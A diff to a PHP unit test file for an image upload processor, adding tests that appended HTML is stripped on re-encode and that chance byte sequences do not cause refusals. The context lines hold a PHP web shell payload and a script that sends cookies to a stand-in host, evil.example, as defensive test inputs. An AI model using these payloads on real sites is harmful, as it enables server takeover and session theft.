@@ -209,7 +209,23 @@ final class NarcoticsImageProcessorTest extends TestCase
 
         $this->assertRefused($photo."\n<?php system(\$_GET['c']); ?>", 'photo_unsafe');
         $this->assertRefused($photo.'<script>fetch("https://evil.example/?c="+document.cookie)</script>', 'photo_unsafe');
-        $this->assertRefused($photo.'<!DOCTYPE HTML><html><body>hi</body></html>', 'photo_unsafe');
+    }
+
+    public function test_appended_html_is_dropped_by_the_re_encode_rather_than_refused(): void
+    {
+        $result = $this->processor->process($this->file($this->jpeg(800, 600).'<!DOCTYPE HTML><html><body>hi</body></html>'));
+
+        foreach ([$result->full, $result->preview, $result->thumb] as $bytes) {
+            $this->assertStringNotContainsString('<html', strtolower($bytes));
+        }
+    }
+
+    public function test_short_byte_sequences_inside_photo_data_never_refuse_a_real_photo(): void
+    {
+        // "<%@" occurs by chance in roughly 1 in 8 multi-megabyte photos; it must not be a refusal reason.
+        $result = $this->processor->process($this->file($this->jpeg(800, 600)."\xFF\xFE\x00\x0A<%@ page ;"));
+
+        $this->assertSame([800, 600], [$result->width, $result->height]);
     }
 
     public function test_a_file_over_the_upload_cap_is_refused_before_it_is_decoded(): void
